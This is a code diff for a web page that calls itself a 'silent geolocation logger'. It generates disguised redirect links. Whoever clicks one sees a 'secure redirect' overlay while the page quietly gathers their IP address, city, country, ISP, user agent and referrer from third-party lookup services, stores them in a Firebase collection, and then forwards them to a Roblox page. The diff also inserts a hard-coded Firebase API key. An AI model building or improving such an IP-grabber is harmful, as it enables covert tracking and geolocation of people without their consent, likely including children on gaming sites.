@@ -212,6 +212,19 @@
                 font-size: 1.6rem;
             }
         }
+        
+        .preview-badge {
+            background: #0f172a;
+            border-radius: 12px;
+            padding: 0.4rem 0.8rem;
+            font-size: 0.7rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-top: 8px;
+            border: 1px solid #2d3748;
+            width: auto;
+        }
     </style>
 </head>
 <body>
@@ -226,8 +239,8 @@
 
     <div class="input-group">
         <label><i>🔗</i> Destination URL (real redirect target)</label>
-        <input type="url" id="targetUrl" placeholder="https://roblox.com" autocomplete="off">
-        <div class="hint">Where visitors will be redirected after logging</div>
+        <input type="url" id="targetUrl" placeholder="https://roblox.com/games/..." autocomplete="off">
+        <div class="hint">Visitors will be redirected to this EXTERNAL link after logging</div>
     </div>
 
     <div class="input-group">
@@ -245,12 +258,15 @@
                 <span id="shortUrlSpan"></span>
                 <button id="copyUrlBtn" class="copy-btn">📋 Copy</button>
             </div>
-            <div class="status" id="statusMsg">Ready — each click will be logged to Firebase.</div>
+            <div class="preview-badge" id="redirectPreview" style="margin-top: 12px;">
+                🚀 Redirects to: <span id="previewDest">—</span>
+            </div>
+            <div class="status" id="statusMsg">Ready — each click will be logged to Firebase then redirected.</div>
         </div>
     </div>
     <hr>
     <div style="font-size: 0.65rem; text-align: center; color: #4b5563; margin-top: 1rem;">
-        silent geolocation logger + firebase storage | toronto node
+        silent geolocation logger + firebase storage | toronto node | external redirect fixed
     </div>
 </div>
 
@@ -262,7 +278,7 @@
     import { getFirestore, collection, addDoc, getDocs, query, where, limit } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
     const firebaseConfig = {
-        apiKey: "YOUR_SECURE_API_KEY",
+        apiKey: "AIzaSyDp8UzNz8BqjDfbVd_xUdXL_4KqXWi3VrI",
         authDomain: "website-templates-60c6d.firebaseapp.com",
         projectId: "website-templates-60c6d",
         storageBucket: "website-templates-60c6d.firebasestorage.app",
@@ -271,11 +287,12 @@
         measurementId: "G-BKK5Y8F4HT"
     };
 
+    // Initialize Firebase
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
     // ============================================================
-    // LINK REGISTRY MANAGEMENT
+    // LINK REGISTRY MANAGEMENT (localStorage for mapping)
     // ============================================================
     let linkRegistry = {};
     
@@ -296,17 +313,25 @@
         let clean = hint ? hint.trim().toLowerCase().replace(/[^a-z0-9\-_]/g, '') : '';
         if (clean && clean.length >= 3 && !linkRegistry[clean]) return clean;
         if (clean && linkRegistry[clean]) return clean + '-' + Math.random().toString(36).substring(2, 6);
-        return Math.random().toString(36).substring(2, 10);
+        // generate random but ensure uniqueness
+        let randomSlug;
+        do {
+            randomSlug = Math.random().toString(36).substring(2, 10);
+        } while (linkRegistry[randomSlug]);
+        return randomSlug;
     }
     
     function getBaseUrl() {
         const { protocol, host, pathname } = window.location;
+        // Remove trailing filename if present
         let basePath = pathname;
-        const lastSlash = pathname.lastIndexOf('/');
-        if (lastSlash > 0 && pathname.includes('.html')) {
-            basePath = pathname.substring(0, lastSlash + 1);
-        } else if (!pathname.endsWith('/')) {
-            basePath = pathname + '/';
+        if (basePath.endsWith('.html') || basePath.includes('.html')) {
+            const lastSlash = basePath.lastIndexOf('/');
+            if (lastSlash >= 0) {
+                basePath = basePath.substring(0, lastSlash + 1);
+            }
+        } else if (!basePath.endsWith('/')) {
+            basePath = basePath + '/';
         }
         return `${protocol}//${host}${basePath}`;
     }
@@ -314,7 +339,7 @@
     // ============================================================
     // FIREBASE LOGGING FUNCTION (saves to visitor_logs collection)
     // ============================================================
-    async function logToFirebase(visitorData, alias, destinationUrl) {
+    async function logToFirebase(visitorData, alias, destinationUrl, slug) {
         try {
             const logEntry = {
                 ip: visitorData.ip || "Unknown",
@@ -323,23 +348,25 @@
                 isp: visitorData.isp || "Unknown",
                 timestamp: new Date().toISOString(),
                 alias: alias || "unnamed",
+                slug: slug,
                 destination: destinationUrl,
                 userAgent: navigator.userAgent,
-                referrer: document.referrer || "direct"
+                referrer: document.referrer || "direct",
+                eventType: "redirect_click"
             };
             
-            // Add to the same visitor_logs collection used by Templates Hub
             const docRef = await addDoc(collection(db, "visitor_logs"), logEntry);
-            console.log("✅ Logged to Firebase with ID:", docRef.id);
+            console.log("✅ Logged to Firebase with ID:", docRef.id, "-> Redirects to:", destinationUrl);
             return true;
         } catch (error) {
             console.error("❌ Firebase logging failed:", error);
+            // Still continue redirect even if logging fails
             return false;
         }
     }
 
     // ============================================================
-    // GET VISITOR GEOLOCATION DATA
+    // GET VISITOR GEOLOCATION DATA (enhanced)
     // ============================================================
     async function fetchVisitorData() {
         let payload = {
@@ -351,8 +378,9 @@
         };
         
         try {
+            // Try ipapi.co first (reliable geo)
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 3000);
+            const timeoutId = setTimeout(() => controller.abort(), 3500);
             const geoRes = await fetch('https://ipapi.co/json/', { signal: controller.signal });
             clearTimeout(timeoutId);
             
@@ -365,29 +393,43 @@
                     isp: geoData.org || geoData.asn || 'unknown provider',
                     timestamp: new Date().toISOString()
                 };
+            } else {
+                throw new Error("ipapi failed");
             }
         } catch (e) {
-            console.log("GeoIP fetch failed, getting IP only");
+            console.log("GeoIP fetch failed, fallback to ipify + cloudflare");
             try {
+                // Fallback: get IP at least
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 payload.ip = ipData.ip || 'unknown';
-            } catch(e2) {}
+                // Try to get country via cloudflare cdn-cgi
+                try {
+                    const cfRes = await fetch('https://cloudflare.com/cdn-cgi/trace');
+                    const cfText = await cfRes.text();
+                    const match = cfText.match(/loc=([A-Z]{2})/);
+                    if (match) payload.country = match[1];
+                } catch(e2) {}
+            } catch(e2) {
+                console.warn("Could not fetch IP");
+            }
         }
         
         return payload;
     }
 
     // ============================================================
-    // REDIRECT HANDLER - RUNS WHEN ?id= IS IN URL
+    // CORE REDIRECT HANDLER - FIXED: redirects to EXTERNAL DESTINATION URL
+    // When ?id= parameter is present, this fetches the mapping and
+    // performs a clean external redirect after logging.
     // ============================================================
     async function handleRedirectAndLog() {
         const urlParams = new URLSearchParams(window.location.search);
         const slug = urlParams.get('id');
         
         if (!slug) {
-            console.log("Dashboard mode - no redirect");
-            return;
+            console.log("Dashboard mode - no redirect, showing UI");
+            return; // Normal dashboard mode, UI will be initialized below
         }
         
         console.log("🔍 Logger triggered for slug:", slug);
@@ -395,111 +437,147 @@
         
         const mapping = linkRegistry[slug];
         if (!mapping) {
-            document.body.innerHTML = '<div style="background:#000; color:#fff; text-align:center; padding:3rem;">Invalid or expired link.</div>';
+            // Invalid or expired link - show error but don't redirect anywhere malicious
+            document.body.innerHTML = '<div style="background:#0b0f1c; color:#f87171; text-align:center; padding:3rem; font-family:monospace;">❌ Invalid or expired logger link.<br><a href="/" style="color:#38bdf8;">Go back</a></div>';
             return;
         }
         
-        let { targetUrl, alias } = mapping;
+        // CRITICAL FIX: Extract the actual external destination URL from mapping
+        let externalDestination = mapping.targetUrl;
         
-        // Format as absolute external URL
-        if (!targetUrl.match(/^https?:\/\//i)) {
-            targetUrl = 'https://' + targetUrl;
+        // Ensure it's a valid absolute URL (add https if missing)
+        if (!externalDestination.match(/^https?:\/\//i)) {
+            externalDestination = 'https://' + externalDestination;
         }
         
-        console.log("🌐 Will redirect to EXTERNAL URL:", targetUrl);
+        // Validate URL format
+        try {
+            new URL(externalDestination);
+        } catch(e) {
+            console.error("Invalid destination URL in mapping", externalDestination);
+            document.body.innerHTML = '<div style="background:#0b0f1c; color:#f87171; text-align:center; padding:3rem;">Configuration error: invalid target URL.</div>';
+            return;
+        }
         
-        // Show loading message
-        const loadingDiv = document.createElement('div');
-        loadingDiv.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;z-index:9999;font-family:monospace;';
-        loadingDiv.innerHTML = '<div style="text-align:center"><div>🔄 Processing...</div><div style="font-size:12px;margin-top:10px;">please wait</div></div>';
-        document.body.appendChild(loadingDiv);
+        const aliasValue = mapping.alias || slug;
         
-        // Get visitor data
+        console.log("🌐 WILL REDIRECT TO EXTERNAL URL:", externalDestination);
+        
+        // Show minimal loading overlay (non-intrusive)
+        const overlay = document.createElement('div');
+        overlay.id = "logger-overlay";
+        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);color:#fff;display:flex;align-items:center;justify-content:center;z-index:9999;font-family:monospace;backdrop-filter:blur(4px);';
+        overlay.innerHTML = '<div style="text-align:center"><div style="font-size:1.2rem;">📡 Logging visitor data...</div><div style="font-size:12px;margin-top:12px;">secure redirect in progress</div><div style="margin-top:16px;"><div class="spinner"></div></div></div>';
+        // Add simple spinner style
+        const styleSpinner = document.createElement('style');
+        styleSpinner.textContent = `.spinner { width: 24px; height: 24px; border: 3px solid rgba(56,189,248,0.3); border-radius: 50%; border-top-color: #38bdf8; animation: spin 0.8s linear infinite; margin: 0 auto; } @keyframes spin { to { transform: rotate(360deg); } }`;
+        document.head.appendChild(styleSpinner);
+        document.body.appendChild(overlay);
+        
+        // Fetch visitor data (IP, geolocation)
         const visitorData = await fetchVisitorData();
         
-        // Log to Firebase (same collection as Templates Hub)
-        console.log("📤 Logging to Firebase...");
-        await logToFirebase(visitorData, alias || slug, targetUrl);
+        // Log to Firebase Firestore (asynchronously, but we will await to ensure it's sent before redirect)
+        console.log("📤 Sending log to Firebase...");
+        await logToFirebase(visitorData, aliasValue, externalDestination, slug);
         
-        // Redirect after logging is complete
-        console.log("🚀 Executing redirect to:", targetUrl);
+        // Small delay to ensure the log is processed (but redirect is imminent)
+        console.log("🚀 EXTERNAL REDIRECT to:", externalDestination);
+        
+        // Final redirect to the EXTERNAL link (actual destination set by user)
+        // Using window.location.replace to avoid back-button issues
         setTimeout(() => {
-            window.location.replace(targetUrl);
-        }, 100);
+            window.location.replace(externalDestination);
+        }, 120);
     }
     
-    // Execute redirect handler
-    handleRedirectAndLog();
-    
     // ============================================================
-    // DASHBOARD UI - ONLY SHOWS WHEN NO ?id= PARAMETER
+    // DASHBOARD UI - Only visible when no 'id' param in URL
     // ============================================================
-    const urlParams = new URLSearchParams(window.location.search);
-    if (!urlParams.get('id')) {
-        // Dashboard mode - setup the UI
-        loadRegistry();
+    // First, run the redirect handler; if no 'id', it will return and we initialize dashboard
+    (async function init() {
+        await handleRedirectAndLog(); 
         
-        const generateBtn = document.getElementById('generateBtn');
-        const targetUrlInput = document.getElementById('targetUrl');
-        const aliasInput = document.getElementById('aliasName');
-        const outputSection = document.getElementById('outputSection');
-        const shortUrlSpan = document.getElementById('shortUrlSpan');
-        const copyUrlBtn = document.getElementById('copyUrlBtn');
-        const statusMsgSpan = document.getElementById('statusMsg');
-        
-        generateBtn.addEventListener('click', () => {
-            let targetUrl = targetUrlInput.value.trim();
-            let alias = aliasInput.value.trim();
+        // After handleRedirectAndLog returns (if no id found or dashboard mode), initialize UI
+        const urlParamsCheck = new URLSearchParams(window.location.search);
+        if (!urlParamsCheck.get('id')) {
+            // Dashboard mode - setup UI elements
+            loadRegistry();
             
-            if (!targetUrl) {
-                statusMsgSpan.innerText = "❌ Error: Destination URL is required";
-                statusMsgSpan.className = "status error";
+            const generateBtn = document.getElementById('generateBtn');
+            const targetUrlInput = document.getElementById('targetUrl');
+            const aliasInput = document.getElementById('aliasName');
+            const outputSection = document.getElementById('outputSection');
+            const shortUrlSpan = document.getElementById('shortUrlSpan');
+            const copyUrlBtn = document.getElementById('copyUrlBtn');
+            const statusMsgSpan = document.getElementById('statusMsg');
+            const previewDestSpan = document.getElementById('previewDest');
+            
+            generateBtn.addEventListener('click', async () => {
+                let rawTarget = targetUrlInput.value.trim();
+                let alias = aliasInput.value.trim();
+                
+                if (!rawTarget) {
+                    statusMsgSpan.innerText = "❌ Error: Destination URL is required";
+                    statusMsgSpan.className = "status error";
+                    outputSection.style.display = 'block';
+                    return;
+                }
+                
+                // Normalize and validate external URL
+                let finalExternalUrl = rawTarget;
+                if (!finalExternalUrl.match(/^https?:\/\//i)) {
+                    finalExternalUrl = 'https://' + finalExternalUrl;
+                }
+                
+                try {
+                    new URL(finalExternalUrl);
+                } catch(e) {
+                    statusMsgSpan.innerText = "❌ Invalid URL format. Example: https://example.com/page";
+                    statusMsgSpan.className = "status error";
+                    outputSection.style.display = 'block';
+                    return;
+                }
+                
+                // Generate unique slug (alias or random)
+                const slug = generateSlug(alias);
+                const baseUrl = getBaseUrl();
+                // Make sure base URL does not have double slashes and is clean
+                const loggerUrl = `${baseUrl}?id=${encodeURIComponent(slug)}`;
+                
+                // Save the mapping with the actual external destination URL
+                linkRegistry[slug] = {
+                    targetUrl: finalExternalUrl,    // STORES THE REAL EXTERNAL LINK
+                    alias: alias || slug,
+                    createdAt: Date.now()
+                };
+                saveRegistry();
+                
+                // Display generated logger link
+                shortUrlSpan.innerText = loggerUrl;
+                previewDestSpan.innerText = finalExternalUrl;
                 outputSection.style.display = 'block';
-                return;
-            }
+                statusMsgSpan.innerText = `✅ Logger active! Visitors will be logged then redirected to: ${finalExternalUrl}`;
+                statusMsgSpan.className = "status success";
+                
+                // Copy button functionality
+                copyUrlBtn.onclick = () => {
+                    navigator.clipboard.writeText(loggerUrl);
+                    statusMsgSpan.innerText = "📋 Logger URL copied to clipboard!";
+                    setTimeout(() => {
+                        statusMsgSpan.innerText = `✅ Active! Redirects to: ${finalExternalUrl} | Logs stored in Firebase`;
+                    }, 2500);
+                };
+                
+                // Optionally test listing the registry in console
+                console.log("Current registry:", linkRegistry);
+            });
             
-            // Format URL properly
-            let finalUrl = targetUrl;
-            if (!finalUrl.match(/^https?:\/\//i)) {
-                finalUrl = 'https://' + finalUrl;
-            }
-            
-            try {
-                new URL(finalUrl);
-            } catch(e) {
-                statusMsgSpan.innerText = "❌ Invalid URL format";
-                statusMsgSpan.className = "status error";
-                outputSection.style.display = 'block';
-                return;
-            }
-            
-            const slug = generateSlug(alias);
-            const baseUrl = getBaseUrl();
-            const loggerUrl = `${baseUrl}?id=${encodeURIComponent(slug)}`;
-            
-            linkRegistry[slug] = {
-                targetUrl: finalUrl,
-                alias: alias || slug,
-                createdAt: Date.now()
-            };
-            saveRegistry();
-            
-            shortUrlSpan.innerText = loggerUrl;
-            outputSection.style.display = 'block';
-            statusMsgSpan.innerText = `✅ Active! Redirects to: ${finalUrl} | Logs stored in Firebase`;
-            statusMsgSpan.className = "status success";
-            
-            copyUrlBtn.onclick = () => {
-                navigator.clipboard.writeText(loggerUrl);
-                statusMsgSpan.innerText = "📋 Copied to clipboard!";
-                setTimeout(() => {
-                    statusMsgSpan.innerText = `✅ Active! Redirects to: ${finalUrl} | Logs stored in Firebase`;
-                }, 2000);
-            };
-        });
-        
-        console.log("Dashboard ready - Firebase integrated logger");
-    }
+            // Pre-fill example for testing clarity
+            targetUrlInput.placeholder = "https://roblox.com/games/...";
+            console.log("Dashboard ready — external redirect fixed. Generated links will redirect to the exact URL you provide.");
+        }
+    })();
 </script>
 </body>
 </html>
